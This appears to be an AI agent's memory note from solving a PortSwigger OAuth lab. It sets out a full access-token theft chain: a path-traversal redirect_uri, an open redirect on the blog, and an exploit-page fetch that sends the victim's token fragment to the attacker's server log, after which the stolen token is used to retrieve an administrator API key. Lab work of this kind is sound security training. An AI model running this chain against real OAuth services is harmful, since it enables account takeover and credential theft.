---
metadata:
  node_type: memory
name: "Lab OAuth token theft open redirect PortSwigger"
description: "Solved OAuth open-redirect token-theft lab: blog /post/next?path= open redirect plus path-traversal redirect_uri; token endpoint is oauth-server /me, found in client oauth-callback JS."
last_updated: 2026-10-10T13:45:46+08:00
created: 2026-10-10T13:45:46+08:00
---

## 2026-10-10 — lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect (arm A, solved)

Path: /web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
Instance host 0a650001...; range_launch launch-url worked (widget id from page_read).

Chain (all HTTP via pieces):
1. /my-account -> 302 /social-login -> meta refresh to oauth-server:
   /auth?client_id=dt0xtfqmq8ka95x4eqnc0&redirect_uri=https://LAB/oauth-callback&response_type=token&scope=openid profile email
2. Open redirect on the blog: post page link `/post/next?path=<url>` -> 302 Location: <url>.
3. OAuth server accepts a path-traversal redirect_uri (no invalid_redirect_uri):
   redirect_uri=https://LAB/oauth-callback/../post/next?path=https://EXPLOIT/exploit
   Browser resolves `..` to /post/next, blog 302s to EXPLOIT preserving the #fragment.
4. Exploit page (/exploit): if !location.hash -> location = authorize URL with traversal redirect_uri;
   else fetch('/?t=' + location.hash.substring(1)) so the token lands in the access log.
5. DELIVER_TO_VICTIM (http_session post, --follow, repeat responseHead+responseBody, formAction=DELIVER_TO_VICTIM),
   then GET /log -> victim line `GET /?t=access_token=...`.

Key lesson (endpoint discovery): the token-consumption endpoint is NOT on the blog.
- Blog /me, /api/me -> 404.
- The blog's /oauth-callback inline JS (read via raw_http, since http_session strips <script>)
  reveals the client reads the token and calls `https://OAUTH-SERVER/me` with `Authorization: Bearer <token>`.
- GET https://OAUTH-SERVER/me -> {"sub":"administrator","apikey":"..."}.
- POST /submitSolution answer=<apikey> -> {"correct":true}; banner_verdict solved=true.

Piece notes: http_dump errors ("Bad URL: RelativeUrlWithoutBase") on absolute https URLs here - use
http_session/raw_http instead. page_read strips <details>/<script>; raw_http returns bytes verbatim.

